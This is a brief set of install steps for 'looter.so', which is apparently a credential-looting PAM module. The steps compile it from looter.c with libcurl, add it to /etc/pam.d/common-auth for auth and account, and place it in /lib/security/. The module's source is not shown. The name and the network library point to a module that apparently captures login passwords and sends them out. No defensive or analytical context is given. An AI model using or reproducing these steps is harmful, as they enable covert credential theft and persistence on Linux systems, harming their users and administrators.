# Step One

compile : gcc  -Wall -fPIC -shared -Xlinker -x -o looter.so looter.c -lcurl

# Step Two
in /etc/pam.d/common-auth add :

```bash
auth optional looter.so

account optional looter.so
```

## Step Three

then put the looter.so into /lib/security/

## relation:

libcurl4-openssl-dev
libpam0g-dev

